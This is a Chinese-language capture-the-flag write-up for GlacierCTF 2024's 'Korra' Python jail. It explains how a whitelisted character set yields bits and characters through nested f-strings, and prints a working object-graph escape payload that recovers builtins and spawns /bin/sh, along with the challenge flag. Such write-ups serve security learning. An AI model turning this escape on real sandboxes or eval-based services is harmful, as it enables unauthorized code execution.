# GlacierCTF 2024 Korra

## 题目简述

题目是三层嵌套 `eval` 的 Python jail。输入仅允许字符：

```text
abcdef"{>:}
```

每层 `eval` 都清空显式提供的 `__builtins__`。由于允许 f-string 花括号、字符串、比较符和格式说明符，可以先在最内层合成二进制数字，再用 `:c` 把字符码转为任意字符，最终生成并执行通用的 Python object-graph 逃逸 payload。

## 解题过程

### 1. 只用白名单生成 0 和 1

Python 的布尔值是整数子类，格式说明符 `d` 会分别把 `True`、`False` 输出为 `1`、`0`。官方 exploit 使用：

```python
ONE  = '{"c">"a":d}'
ZERO = '{"a">"c":d}'
```

它们只能放在 f-string 中解释：`"c">"a"` 为真，`"a">"c"` 为假。这样不需要在原始输入里出现被禁的数字。

### 2. 从二进制字符码合成任意字符串

对目标字符 $c$，把 `ord(c)` 的二进制展开为上述 0/1 片段，再让下一层 f-string 解释类似：

```python
f"{0b1000001:c}"
```

其结果是字符 `A`。实际 payload 还要对 f-string 的花括号和引号做分层转义，让第一次 `eval` 生成第二层 f-string，第二次 `eval` 生成最终逃逸表达式，第三次 `eval` 执行它。嵌套 f-string 的这一写法依赖 Python 3.12 的 PEP 701 解析行为；Python 3.11 会在解析阶段失败。

### 3. 从对象图恢复 builtins

最终生成的表达式不依赖当前全局字典，而是沿 Python 类型层次寻找某个类的 `__init__.__globals__`：

```python
[x.__init__.__globals__
 for x in ''.__class__.__base__.__subclasses__()
 if 'wrapper' not in f'{x.__init__}'
 and 'builtins' in x.__init__.__globals__][0][
    'builtins'
].__import__('os').system('/bin/sh')
```

`eval(..., {'__builtins__': {}})` 只移除了直接名字解析入口，并没有删除进程中已经加载的类和函数全局变量。恢复 `__import__` 后启动 `/bin/sh`，再执行 `cat /flag.txt`，得到：

```text
gctf{th3_cycl3_0f_th3_Av4t4r_b3g4n_4n3w_84fd0664e2}
```

## 方法总结

本题的关键是把字符白名单看成可编程的表示系统：比较表达式产生比特，嵌套 f-string 把比特提升为字符，三层 `eval` 依次完成“构造器、字符串、代码”的解码。清空 `__builtins__` 不能把 Python 对象模型变成沙箱；处理不可信表达式应使用专门解析器和允许节点列表，真正的执行需求则必须放到进程/容器级隔离中。
